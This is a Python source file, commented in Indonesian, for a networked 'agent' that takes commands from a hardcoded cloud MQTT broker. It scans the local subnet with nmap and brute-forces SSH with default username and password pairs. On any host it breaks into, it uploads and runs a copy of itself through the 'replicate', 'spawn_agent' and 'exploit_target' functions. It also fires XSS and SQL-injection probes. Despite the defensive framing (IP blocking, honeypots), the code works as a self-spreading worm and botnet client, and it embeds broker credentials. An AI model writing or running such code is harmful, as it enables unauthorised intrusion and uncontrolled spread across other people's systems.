import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
import json
import time
import uuid
import requests
import subprocess
import psutil
from datetime import datetime
import paramiko
import nmap
import socket
import threading
from urllib.parse import urlparse
import os
import logging

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Konfigurasi agent dari variabel lingkungan dengan default
AGENT_ID = str(uuid.uuid4())
MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")
MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")
TOPIC_REPORTS = "throng/reports"
TOPIC_COMMANDS = f"throng/commands/{AGENT_ID}"
TOPIC_PEER = "throng/peer"
TOPIC_SCANS = "throng/scans"
TOPIC_EMERGENCY = "throng/emergency"

# Callback saat terkoneksi
def on_connect(client, userdata, flags, rc, properties=None):
    logger.info(f"Agent {AGENT_ID} connected with code {rc}")
    if rc == 0:
        client.subscribe(TOPIC_COMMANDS)
        client.subscribe(TOPIC_PEER)
        client.subscribe(TOPIC_EMERGENCY)

# Callback saat menerima perintah
def on_message(client, userdata, msg):
    try:
        command = json.loads(msg.payload.decode())
        if command.get("agent_id") == AGENT_ID or msg.topic in [TOPIC_PEER, TOPIC_EMERGENCY]:
            action = command.get("action")
            target = command.get("target")
            params = command.get("params", {})
            emergency = command.get("emergency", False)
            
            logger.info(f"Received command: {action} on {target} (Emergency: {emergency})")
            
            if action == "block_ip":
                block_ip(target, emergency)
            elif action == "send_honeypot":
                send_honeypot(target, emergency)
            elif action == "redirect_traffic":
                redirect_traffic(target, emergency)
            elif action == "spawn_agent":
                spawn_agent(target, params.get("credentials"))
            elif action == "replicate":
                replicate(target, params.get("credentials"))
            elif action == "scan_target":
                scan_target(target, emergency)
            elif action == "exploit_target":
                exploit_target(target, params, emergency)
    except Exception as e:
        logger.error(f"Error processing command: {e}")

# Modul pengambilan keputusan
def decide_action(report_data):
    traffic = report_data.get("network_traffic", 0)
    is_anomaly = report_data.get("is_anomaly", False)
    if is_anomaly or traffic > 50:
        return {"action": "scan_target", "target": "192.168.1.0/24", "emergency": True}
    return None

# Fungsi respons aktif
def block_ip(target, emergency=False):
    try:
        subprocess.run(["iptables", "-A", "INPUT", "-s", target, "-j", "DROP"], check=True)
        logger.info(f"Blocked IP {target}")
        log_action("block_ip", target, emergency)
        if emergency:
            client.publish(TOPIC_EMERGENCY, json.dumps({"agent_id": AGENT_ID, "action": "block_ip", "target": target}))
    except Exception as e:
        logger.error(f"Error in block_ip: {e}")

def send_honeypot(target, emergency=False):
    try:
        fake_data = {
            "log": "Critical intrusion detected" if emergency else "Unauthorized access",
            "timestamp": datetime.now().isoformat(),
            "agent_id": AGENT_ID
        }
        requests.post(f"http://{target}/log", json=fake_data, timeout=2)
        logger.info(f"Sent honeypot to {target}")
        log_action("send_honeypot", target, emergency)
    except Exception as e:
        logger.error(f"Error in send_honeypot: {e}")

def redirect_traffic(target, emergency=False):
    try:
        logger.info(f"Redirected traffic from {target}")
        log_action("redirect_traffic", target, emergency)
    except Exception as e:
        logger.error(f"Error in redirect_traffic: {e}")

def replicate(host, credentials):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=credentials.get("username", "admin"), password=credentials.get("password", "admin"))
        sftp = ssh.open_sftp()
        sftp.put("agent.py", "/tmp/agent.py")
        ssh.exec_command("python3 /tmp/agent.py &")
        sftp.close()
        ssh.close()
        logger.info(f"Replicated to {host}")
        log_action("replicate", host)
    except Exception as e:
        logger.error(f"Error in replicate: {e}")

def spawn_agent(host, credentials):
    try:
        new_agent_id = str(uuid.uuid4())
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=credentials.get("username", "admin"), password=credentials.get("password", "admin"))
        sftp = ssh.open_sftp()
        sftp.put("agent.py", f"/tmp/agent_{new_agent_id}.py")
        ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
        sftp.close()
        ssh.close()
        logger.info(f"Spawned agent {new_agent_id} on {host}")
        log_action("spawn_agent", host)
        client.publish(TOPIC_REPORTS, json.dumps({"agent_id": new_agent_id, "data": {"ip": socket.gethostbyname(host)}}))
    except Exception as e:
        logger.error(f"Error in spawn_agent: {e}")

def scan_target(target, emergency=False):
    try:
        nm = nmap.PortScanner()
        args = "-sS -p 80,443,22" if not emergency else "-sV --script vuln -p 1-1000"
        nm.scan(target, arguments=args)
        scan_data = nm[target].all_protocols()
        vulnerabilities = []

        try:
            response = requests.get(f"http://{target}", timeout=3)
            server = response.headers.get("Server", "")
            if "Apache/2.2" in server or "nginx/1.14" in server:
                vulnerabilities.append(f"Outdated server: {server}")
            if response.status_code >= 500:
                vulnerabilities.append("Server error detected")
            if emergency:
                parsed = urlparse(f"http://{target}")
                test_url = f"{parsed.scheme}://{parsed.netloc}/test?input=<script>alert(1)</script>"
                try:
                    xss_response = requests.get(test_url, timeout=3)
                    if "<script>alert(1)</script>" in xss_response.text:
                        vulnerabilities.append("Potential XSS vulnerability")
                except:
                    pass
        except:
            vulnerabilities.append("No HTTP response")

        report = {
            "agent_id": AGENT_ID,
            "data": {
                "target": target,
                "vulnerability": vulnerabilities,
                "scan_data": scan_data,
                "ip": socket.gethostbyname(socket.gethostname())
            }
        }
        client.publish(TOPIC_SCANS, json.dumps(report))
        logger.info(f"Scan results for {target}: {vulnerabilities}")
        log_action("scan_target", target, emergency)
        if emergency:
            client.publish(TOPIC_EMERGENCY, json.dumps({"agent_id": AGENT_ID, "action": "scan_target", "target": target, "vulnerabilities": vulnerabilities}))
    except Exception as e:
        logger.error(f"Error in scan_target: {e}")

def exploit_target(target, params, emergency=False):
    try:
        credentials_list = params.get("credentials_list", [
            {"username": "admin", "password": "admin"},
            {"username": "root", "password": "root"},
            {"username": "user", "password": "password"}
        ])
        vulnerabilities = []
        for creds in credentials_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=creds["username"], password=creds["password"], timeout=3)
                ssh.close()
                vulnerabilities.append(f"Weak SSH credentials: {creds['username']}:{creds['password']}")
                spawn_agent(target, creds)
                logger.info(f"Exploited and claimed {target}")
                log_action("exploit_target", target, emergency)
                if emergency:
                    client.publish(TOPIC_EMERGENCY, json.dumps({"agent_id": AGENT_ID, "action": "exploit_target", "target": target, "status": "claimed"}))
                return
            except:
                continue
        vulnerabilities.append("No weak SSH credentials found")
        if emergency:
            try:
                response = requests.get(f"http://{target}/login?username=admin'--", timeout=3)
                if "error" not in response.text.lower():
                    vulnerabilities.append("Potential SQL injection vulnerability")
            except:
                pass
        report = {
            "agent_id": AGENT_ID,
            "data": {
                "target": target,
                "vulnerability": vulnerabilities,
                "ip": socket.gethostbyname(socket.gethostname())
            }
        }
        client.publish(TOPIC_SCANS, json.dumps(report))
        log_action("exploit_target", target, emergency, f"Vulnerabilities: {vulnerabilities}")
    except Exception as e:
        logger.error(f"Error in exploit_target: {e}")

def proactive_scan():
    while True:
        try:
            nm = nmap.PortScanner()
            nm.scan("192.168.1.0/24", arguments="-sS -p 80,443,22 --open")
            for host in nm.all_hosts():
                scan_data = nm[host].all_protocols()
                vulnerabilities = []
                try:
                    response = requests.get(f"http://{host}", timeout=3)
                    server = response.headers.get("Server", "")
                    if "Apache/2.2" in server or "nginx/1.14" in server:
                        vulnerabilities.append(f"Outdated server: {server}")
                except:
                    vulnerabilities.append("No HTTP response")
                report = {
                    "agent_id": AGENT_ID,
                    "data": {
                        "target": host,
                        "vulnerability": vulnerabilities,
                        "scan_data": scan_data,
                        "ip": socket.gethostbyname(socket.gethostname())
                    }
                }
                client.publish(TOPIC_SCANS, json.dumps(report))
                logger.info(f"Proactive scan found host: {host}")
                log_action("proactive_scan", host)
        except Exception as e:
            logger.error(f"Error in proactive_scan: {e}")
        time.sleep(1800)  # Scan setiap 30 menit

def collect_data(emergency=False):
    try:
        net_stats = psutil.net_connections()
        suspicious_count = len([conn for conn in net_stats if conn.status == "ESTABLISHED"])
        threat_detected = suspicious_count > (10 if emergency else 50)
        data = {
            "timestamp": datetime.now().isoformat(),
            "network_traffic": suspicious_count,
            "suspicious_activity": threat_detected,
            "ip": socket.gethostbyname(socket.gethostname())
        }
        if threat_detected:
            client.publish(TOPIC_PEER, json.dumps(data))
            action = decide_action(data)
            if action:
                if action["action"] == "scan_target":
                    scan_target(action["target"], action["emergency"])
        return data
    except Exception as e:
        logger.error(f"Error collecting data: {e}")
        return {}

def log_action(action, target, emergency=False, details=""):
    with open("agent_log.txt", "a") as f:
        f.write(f"{datetime.now().isoformat()} | Action: {action} | Target: {target} | Emergency: {emergency} | Details: {details}\n")

def publish_with_retry(topic, payload, retries=3):
    for i in range(retries):
        try:
            client.publish(topic, json.dumps(payload))
            logger.info(f"Published to {topic}")
            return
        except Exception as e:
            logger.error(f"Publish failed: {e}, retry {i+1}/{retries}")
            time.sleep(2 ** i)  # Exponential backoff
    logger.error(f"Failed to publish after {retries} retries")

# Inisialisasi MQTT client
client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
client.on_connect = on_connect
client.on_message = on_message
client.tls_set()
client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
client.connect(MQTT_BROKER.split(":")[0], int(MQTT_BROKER.split(":")[1]), 60)

# Mulai pemindaian proaktif
threading.Thread(target=proactive_scan, daemon=True).start()

# Loop untuk laporan
client.loop_start()
while True:
    report = {
        "agent_id": AGENT_ID,
        "data": collect_data()
    }
    publish_with_retry(TOPIC_REPORTS, report)
    logger.info(f"Agent {AGENT_ID} sent report: {report}")
    time.sleep(60)